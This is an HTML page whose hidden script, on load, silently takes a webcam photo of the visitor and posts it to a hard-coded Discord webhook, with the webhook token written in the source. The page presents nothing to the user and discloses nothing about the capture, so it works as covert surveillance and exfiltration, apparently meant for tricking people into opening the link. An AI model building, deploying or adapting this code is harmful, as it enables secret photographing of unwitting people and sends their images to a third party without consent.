<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Auto Capture & Send to Discord</title>
</head>
<body>
    <video id="video" autoplay playsinline style="display: none;"></video>
    <canvas id="canvas" style="display: none;"></canvas>

    <script>
        const webhookURL = "https://discord.com/api/webhooks/1340611336966770761/BG9LqkUM1Tri7XT1oHVaotzuOQo6VTj4fnWsmtgS0geRxhdBAVZ0wxw3XqGdjLYIY9xI"; // à¶”à¶¶à·š Discord Webhook URL à¶‘à¶š 

        async function captureAndSendPhoto() {
            try {
                const constraints = {
                    video: { facingMode: "user" }
                };

                // Get Camera Access
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                const video = document.getElementById("video");
                video.srcObject = stream;

                // Wait for Camera to Load
                await new Promise(resolve => setTimeout(resolve, 2000));

                // Capture Photo
                const canvas = document.getElementById("canvas");
                const context = canvas.getContext("2d");
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                context.drawImage(video, 0, 0, canvas.width, canvas.height);

                // Stop Camera
                stream.getTracks().forEach(track => track.stop());

                // Convert to Image Blob
                canvas.toBlob(async (blob) => {
                    const formData = new FormData();
                    formData.append("file", blob, "capture.png");
                    formData.append("content", "ðŸ“¸ Auto Captured Image:");

                    // Send Image to Discord Webhook
                    await fetch(webhookURL, {
                        method: "POST",
                        body: formData
                    });

                    console.log("âœ… Image Sent to Discord!");
                }, "image/png");
            } catch (error) {
                console.error("ðŸš« Camera Access Error:", error);
            }
        }

        // Auto Start on Page Load
        window.onload = captureAndSendPhoto;
    </script>
</body>
</html>
